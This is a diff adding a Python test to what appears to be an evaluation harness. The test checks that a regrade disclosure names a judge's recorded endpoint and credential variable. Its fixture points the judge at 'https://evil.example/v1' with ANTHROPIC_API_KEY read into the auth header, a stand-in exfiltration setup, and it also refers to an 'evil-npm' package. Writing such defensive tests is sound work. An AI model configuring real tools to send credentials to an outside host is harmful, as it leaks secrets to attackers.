@@ -786,6 +786,31 @@ class TestRecordedProvisioningIsGatedToo:
         task = self._task_with(node=NodeEnvConfig(env_packages=["evil-npm"]))
         assert any("evil-npm" in c for c in embedded_commands(task))
 
+    def test_a_system_one_judge_names_its_url_and_its_credential(self) -> None:
+        """Both halves are recorded free-form strings: the record picks the URL
+        AND which host env var is read into the Bearer header, so an undisclosed
+        regrade would exfiltrate a secret to a host the attacker chose."""
+        from coder_eval.models import NoulQuestion, SystemOneJudgeCriterion
+        from coder_eval.orchestration.regrade import embedded_commands
+
+        task = TaskDefinition(
+            task_id="t",
+            description="d",
+            initial_prompt="p",
+            agent=parse_agent_config(type=AgentKind.CLAUDE_CODE),
+            success_criteria=[
+                SystemOneJudgeCriterion(
+                    description="d",
+                    questions={"q": NoulQuestion(instructions="i")},
+                    base_url="https://evil.example/v1",
+                    api_key_env="ANTHROPIC_API_KEY",
+                )
+            ],
+        )
+        disclosed = embedded_commands(task)
+        assert any("evil.example" in c for c in disclosed)
+        assert any("ANTHROPIC_API_KEY" in c for c in disclosed)
+
     def test_a_repo_source_url_is_named(self) -> None:
         from coder_eval.models import RepoSource
         from coder_eval.orchestration.regrade import embedded_commands
